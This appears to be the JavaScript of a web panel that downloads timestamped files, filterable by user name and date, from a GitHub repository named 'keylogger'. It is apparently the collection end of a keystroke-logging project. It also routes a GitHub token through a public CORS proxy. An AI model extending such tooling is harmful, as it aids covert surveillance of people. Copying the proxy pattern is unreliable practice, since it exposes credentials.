const GITHUB_API_BASE = "https://api.github.com/repos/bebedudu/keylogger/contents";
const GITHUB_TOKEN = "add_your_token_here"; // Replace with your GitHub PAT


// // downloads the files successfully with user defined value (x unlimited download of unique user)
// Switch between tabs
function switchTab(tabName) {
    document.querySelectorAll('.tab-button').forEach(button => button.classList.remove('active'));
    document.querySelectorAll('.tab-content').forEach(content => content.classList.remove('active'));

    document.querySelector(`#${tabName}-tab`).classList.add('active');
    document.querySelector(`[onclick="switchTab('${tabName}')"]`).classList.add('active');
}

// async function performDownload() {
//     const terminalLog = document.getElementById('downloadTerminalLog');
//     const resultDiv = document.getElementById('downloadResult');

//     // Clear previous terminal log
//     terminalLog.innerHTML = "";

//     // Get user-selected action
//     const action = document.querySelector('input[name="downloadAction"]:checked')?.value;

//     if (!action) {
//         resultDiv.textContent = "Please select an action.";
//         return;
//     }

//     // Get folder paths, date/time ranges, file counts, and user names
//     const folderPaths = [
//         document.getElementById('downloadFolderPath1').value,
//         document.getElementById('downloadFolderPath2').value,
//         // Add more folders as needed
//     ];

//     const startDates = [
//         document.getElementById('downloadStartDate1').value,
//         document.getElementById('downloadStartDate2').value,
//         // Add more folders as needed
//     ];

//     const startTimes = [
//         document.getElementById('downloadStartTime1').value,
//         document.getElementById('downloadStartTime2').value,
//         // Add more folders as needed
//     ];

//     const endDates = [
//         document.getElementById('downloadEndDate1').value,
//         document.getElementById('downloadEndDate2').value,
//         // Add more folders as needed
//     ];

//     const endTimes = [
//         document.getElementById('downloadEndTime1').value,
//         document.getElementById('downloadEndTime2').value,
//         // Add more folders as needed
//     ];

//     const fileCounts = [
//         parseInt(document.getElementById('downloadFileCount1').value),
//         parseInt(document.getElementById('downloadFileCount2').value),
//         // Add more folders as needed
//     ];

//     const userNames = [
//         document.getElementById('downloadUserName1').value.trim(),
//         document.getElementById('downloadUserName2').value.trim(),
//         // Add more folders as needed
//     ];

//     try {
//         for (let i = 0; i < folderPaths.length; i++) {
//             const folderPath = folderPaths[i];
//             const startDate = startDates[i];
//             const startTime = startTimes[i];
//             const endDate = endDates[i];
//             const endTime = endTimes[i];
//             const fileCount = fileCounts[i];
//             const userName = userNames[i];

//             logToTerminal(`Processing folder: ${folderPath}`, terminalLog);

//             const folderUrl = `${GITHUB_API_BASE}/${folderPath}`;
//             const response = await fetch(folderUrl, {
//                 headers: {
//                     "Authorization": `token ${GITHUB_TOKEN}`
//                 }
//             });

//             if (!response.ok) {
//                 logToTerminal(`Failed to fetch files from folder: ${folderPath} - ${response.statusText}`, terminalLog);
//                 continue;
//             }

//             const files = await response.json();

//             if (files.length === 0) {
//                 logToTerminal(`No files found in folder: ${folderPath}`, terminalLog);
//                 continue;
//             }

//             // Sort files by date (most recent first)
//             const sortedFiles = files.sort((a, b) => {
//                 const dateA = a.name.match(/^(\d{8})_(\d{6})/);
//                 const dateB = b.name.match(/^(\d{8})_(\d{6})/);
//                 if (!dateA || !dateB) return 0;
//                 return `${dateB[1]}${dateB[2]}`.localeCompare(`${dateA[1]}${dateA[2]}`);
//             });

//             // Filter files based on the selected action
//             const filteredFiles = sortedFiles.filter(file => {
//                 if (action === "downloadInRange") {
//                     const match = file.name.match(/^(\d{8})_(\d{6})/);
//                     const fileDate = match?.[1];
//                     const fileTime = match?.[2];
//                     if (fileDate && fileTime) {
//                         return (
//                             fileDate >= startDate &&
//                             fileDate <= endDate &&
//                             fileTime >= startTime &&
//                             fileTime <= endTime
//                         );
//                     }
//                     return false;
//                 } else if (action === "downloadCount") {
//                     return true; // No filtering needed, just limit by count later
//                 } else if (action === "downloadByUser") {
//                     return file.name.includes(userName);
//                 }
//                 return false;
//             });

//             // Limit the number of files to download
//             const filesToDownload = action === "downloadCount"
//                 ? filteredFiles.slice(0, fileCount)
//                 : filteredFiles;

//             // Download files
//             for (const file of filesToDownload) {
//                 const downloadUrl = file.download_url;
//                 if (!downloadUrl) {
//                     logToTerminal(`Skipping file (no download URL): ${file.name} from folder: ${folderPath}`, terminalLog);
//                     continue;
//                 }

//                 try {
//                     await downloadFile(downloadUrl, file.name, terminalLog);
//                     logToTerminal(`Downloaded file: ${file.name} from folder: ${folderPath}`, terminalLog);
//                 } catch (error) {
//                     logToTerminal(`Error downloading file: ${file.name} from folder: ${folderPath} - ${error.message}`, terminalLog);
//                 }
//             }
//         }

//         resultDiv.textContent = "Operation completed. Check the terminal log for details.";
//     } catch (error) {
//         console.error(error);
//         resultDiv.textContent = `Error: ${error.message}`;
//     }
// }

// async function downloadFile(url, fileName, terminalLog) {
//     try {
//         // Use a CORS proxy to bypass CORS restrictions
//         const proxyUrl = `https://cors-anywhere.herokuapp.com/${url}`;
//         const response = await fetch(proxyUrl, {
//             headers: {
//                 "Authorization": `token ${GITHUB_TOKEN}`
//             }
//         });

//         if (!response.ok) {
//             throw new Error(`Failed to download file: ${response.statusText}`);
//         }

//         const blob = await response.blob();
//         const link = document.createElement("a");
//         link.href = URL.createObjectURL(blob);
//         link.download = fileName;
//         link.click();
//     } catch (error) {
//         throw new Error(`Error downloading file: ${error.message}`);
//     }
// }

function logToTerminal(message, terminalLog) {
    const logEntry = document.createElement("p");
    logEntry.textContent = message;
    terminalLog.appendChild(logEntry);
    terminalLog.scrollTop = terminalLog.scrollHeight;
}

















// no. of file is effecting now all menu item (x date & time range also need this)
async function performDownload() {
    const terminalLog = document.getElementById('downloadTerminalLog');
    const resultDiv = document.getElementById('downloadResult');

    // Clear previous terminal log
    terminalLog.innerHTML = "";

    // Get user-selected action
    const action = document.querySelector('input[name="downloadAction"]:checked')?.value;

    if (!action) {
        resultDiv.textContent = "Please select an action.";
        return;
    }

    // Get folder paths, date/time ranges, file counts, and user names
    const folderPaths = [
        document.getElementById('downloadFolderPath1').value,
        document.getElementById('downloadFolderPath2').value,
        // Add more folders as needed
    ];

    const startDates = [
        document.getElementById('downloadStartDate1').value,
        document.getElementById('downloadStartDate2').value,
        // Add more folders as needed
    ];

    const startTimes = [
        document.getElementById('downloadStartTime1').value,
        document.getElementById('downloadStartTime2').value,
        // Add more folders as needed
    ];

    const endDates = [
        document.getElementById('downloadEndDate1').value,
        document.getElementById('downloadEndDate2').value,
        // Add more folders as needed
    ];

    const endTimes = [
        document.getElementById('downloadEndTime1').value,
        document.getElementById('downloadEndTime2').value,
        // Add more folders as needed
    ];

    const fileCounts = [
        parseInt(document.getElementById('downloadFileCount1').value),
        parseInt(document.getElementById('downloadFileCount2').value),
        // Add more folders as needed
    ];

    const userNames = [
        document.getElementById('downloadUserName1').value.trim(),
        document.getElementById('downloadUserName2').value.trim(),
        // Add more folders as needed
    ];

    try {
        for (let i = 0; i < folderPaths.length; i++) {
            const folderPath = folderPaths[i];
            const startDate = startDates[i];
            const startTime = startTimes[i];
            const endDate = endDates[i];
            const endTime = endTimes[i];
            const fileCount = fileCounts[i];
            const userName = userNames[i];

            logToTerminal(`Processing folder: ${folderPath}`, terminalLog);

            const folderUrl = `${GITHUB_API_BASE}/${folderPath}`;
            const response = await fetch(folderUrl, {
                headers: {
                    "Authorization": `token ${GITHUB_TOKEN}`
                }
            });

            if (!response.ok) {
                logToTerminal(`Failed to fetch files from folder: ${folderPath} - ${response.statusText}`, terminalLog);
                continue;
            }

            const files = await response.json();

            if (files.length === 0) {
                logToTerminal(`No files found in folder: ${folderPath}`, terminalLog);
                continue;
            }

            // Sort files by date (most recent first)
            const sortedFiles = files.sort((a, b) => {
                const dateA = a.name.match(/^(\d{8})_(\d{6})/);
                const dateB = b.name.match(/^(\d{8})_(\d{6})/);
                if (!dateA || !dateB) return 0;
                return `${dateB[1]}${dateB[2]}`.localeCompare(`${dateA[1]}${dateA[2]}`);
            });

            // Filter files based on the selected action
            let filteredFiles = [];
            if (action === "downloadInRange") {
                filteredFiles = sortedFiles.filter(file => {
                    const match = file.name.match(/^(\d{8})_(\d{6})/);
                    const fileDate = match?.[1];
                    const fileTime = match?.[2];
                    if (fileDate && fileTime) {
                        return (
                            fileDate >= startDate &&
                            fileDate <= endDate &&
                            fileTime >= startTime &&
                            fileTime <= endTime
                        );
                    }
                    return false;
                });
            } else if (action === "downloadByUser") {
                filteredFiles = sortedFiles.filter(file => file.name.includes(userName));
            } else if (action === "downloadCount") {
                filteredFiles = sortedFiles;
            }

            // Apply the "Number of Files to Download" limit
            const filesToDownload = filteredFiles.slice(0, fileCount);

            // Download files
            for (const file of filesToDownload) {
                const downloadUrl = file.download_url;
                if (!downloadUrl) {
                    logToTerminal(`Skipping file (no download URL): ${file.name} from folder: ${folderPath}`, terminalLog);
                    continue;
                }

                try {
                    await downloadFile(downloadUrl, file.name, terminalLog);
                    logToTerminal(`Downloaded file: ${file.name} from folder: ${folderPath}`, terminalLog);
                } catch (error) {
                    logToTerminal(`Error downloading file: ${file.name} from folder: ${folderPath} - ${error.message}`, terminalLog);
                }
            }
        }

        resultDiv.textContent = "Operation completed. Check the terminal log for details.";
    } catch (error) {
        console.error(error);
        resultDiv.textContent = `Error: ${error.message}`;
    }
}

async function downloadFile(url, fileName, terminalLog) {
    try {
        // Use a CORS proxy to bypass CORS restrictions
        const proxyUrl = `https://cors-anywhere.herokuapp.com/${url}`;
        const response = await fetch(proxyUrl, {
            headers: {
                "Authorization": `token ${GITHUB_TOKEN}`
            }
        });

        if (!response.ok) {
            throw new Error(`Failed to download file: ${response.statusText}`);
        }

        const blob = await response.blob();
        const link = document.createElement("a");
        link.href = URL.createObjectURL(blob);
        link.download = fileName;
        link.click();
    } catch (error) {
        throw new Error(`Error downloading file: ${error.message}`);
    }
}






















// error somewhere 
// async function performDownload() {
//     const terminalLog = document.getElementById('downloadTerminalLog');
//     const resultDiv = document.getElementById('downloadResult');

//     // Clear previous terminal log
//     terminalLog.innerHTML = "";

//     // Get user-selected action
//     const action = document.querySelector('input[name="downloadAction"]:checked')?.value;

//     if (!action) {
//         resultDiv.textContent = "Please select an action.";
//         return;
//     }

//     // Get folder paths, date/time ranges, file counts, and user names
//     const folderPaths = [
//         document.getElementById('downloadFolderPath1').value,
//         document.getElementById('downloadFolderPath2').value,
//         // Add more folders as needed
//     ];

//     const startDates = [
//         document.getElementById('downloadStartDate1').value,
//         document.getElementById('downloadStartDate2').value,
//         // Add more folders as needed
//     ];

//     const startTimes = [
//         document.getElementById('downloadStartTime1').value,
//         document.getElementById('downloadStartTime2').value,
//         // Add more folders as needed
//     ];

//     const endDates = [
//         document.getElementById('downloadEndDate1').value,
//         document.getElementById('downloadEndDate2').value,
//         // Add more folders as needed
//     ];

//     const endTimes = [
//         document.getElementById('downloadEndTime1').value,
//         document.getElementById('downloadEndTime2').value,
//         // Add more folders as needed
//     ];

//     const fileCounts = [
//         parseInt(document.getElementById('downloadFileCount1').value) || 0, // Default to 0 if empty
//         parseInt(document.getElementById('downloadFileCount2').value) || 0, // Default to 0 if empty
//         // Add more folders as needed
//     ];

//     const userNames = [
//         document.getElementById('downloadUserName1').value.trim(),
//         document.getElementById('downloadUserName2').value.trim(),
//         // Add more folders as needed
//     ];

//     try {
//         for (let i = 0; i < folderPaths.length; i++) {
//             const folderPath = folderPaths[i];
//             const startDate = startDates[i];
//             const startTime = startTimes[i];
//             const endDate = endDates[i];
//             const endTime = endTimes[i];
//             const fileCount = fileCounts[i]; // May be 0 if not specified
//             const userName = userNames[i];

//             logToTerminal(`Processing folder: ${folderPath}`, terminalLog);

//             const folderUrl = `${GITHUB_API_BASE}/${folderPath}`;
//             const response = await fetch(folderUrl, {
//                 headers: {
//                     "Authorization": `token ${GITHUB_TOKEN}`
//                 }
//             });

//             if (!response.ok) {
//                 logToTerminal(`Failed to fetch files from folder: ${folderPath} - ${response.statusText}`, terminalLog);
//                 continue;
//             }

//             const files = await response.json();

//             if (files.length === 0) {
//                 logToTerminal(`No files found in folder: ${folderPath}`, terminalLog);
//                 continue;
//             }

//             // Sort files by date (most recent first)
//             const sortedFiles = files.sort((a, b) => {
//                 const dateA = a.name.match(/^(\d{8})_(\d{6})/);
//                 const dateB = b.name.match(/^(\d{8})_(\d{6})/);
//                 if (!dateA || !dateB) return 0;
//                 return `${dateB[1]}${dateB[2]}`.localeCompare(`${dateA[1]}${dateA[2]}`);
//             });

//             // Filter files based on the selected action
//             let filteredFiles = [];
//             if (action === "downloadInRange") {
//                 filteredFiles = sortedFiles.filter(file => {
//                     const match = file.name.match(/^(\d{8})_(\d{6})/);
//                     const fileDate = match?.[1];
//                     const fileTime = match?.[2];
//                     if (fileDate && fileTime) {
//                         return (
//                             fileDate >= startDate &&
//                             fileDate <= endDate &&
//                             fileTime >= startTime &&
//                             fileTime <= endTime
//                         );
//                     }
//                     return false;
//                 });
//             } else if (action === "downloadByUser") {
//                 filteredFiles = sortedFiles.filter(file => file.name.includes(userName));
//             } else if (action === "downloadCount") {
//                 filteredFiles = sortedFiles;
//             }

//             // Apply the "Number of Files to Download" limit (if specified)
//             const filesToDownload = fileCount > 0 ? filteredFiles.slice(0, fileCount) : filteredFiles;

//             // Download files
//             for (const file of filesToDownload) {
//                 const downloadUrl = file.download_url;
//                 if (!downloadUrl) {
//                     logToTerminal(`Skipping file (no download URL): ${file.name} from folder: ${folderPath}`, terminalLog);
//                     continue;
//                 }

//                 try {
//                     await downloadFile(downloadUrl, file.name, terminalLog);
//                     logToTerminal(`Downloaded file: ${file.name} from folder: ${folderPath}`, terminalLog);
//                 } catch (error) {
//                     logToTerminal(`Error downloading file: ${file.name} from folder: ${folderPath} - ${error.message}`, terminalLog);
//                 }
//             }
//         }

//         resultDiv.textContent = "Operation completed. Check the terminal log for details.";
//     } catch (error) {
//         console.error(error);
//         resultDiv.textContent = `Error: ${error.message}`;
//     }
// }

// async function downloadFile(url, fileName, terminalLog, retries = 3, delay = 2000) {
//     let attempt = 1;

//     while (attempt <= retries) {
//         try {
//             const proxyUrl = `https://cors-anywhere.herokuapp.com/${url}`;
//             const response = await fetch(proxyUrl, {
//                 headers: {
//                     "Authorization": `token ${GITHUB_TOKEN}`
//                 }
//             });

//             if (!response.ok) {
//                 throw new Error(`Failed to download file: ${response.statusText}`);
//             }

//             const blob = await response.blob();
//             const link = document.createElement("a");
//             link.href = URL.createObjectURL(blob);
//             link.download = fileName;
//             link.click();
//             return; // Success, exit the loop
//         } catch (error) {
//             if (attempt === retries) {
//                 logToTerminal(`All ${retries} attempts failed for file: ${fileName}. Last error: ${error.message}`, terminalLog);
//                 throw new Error(`All ${retries} attempts failed. Last error: ${error.message}`);
//             }
//             logToTerminal(`Attempt ${attempt} failed for file: ${fileName}. Retrying in ${delay / 1000} seconds...`, terminalLog);
//             await new Promise(resolve => setTimeout(resolve, delay)); // Wait before retrying
//             attempt++;
//         }
//     }
// }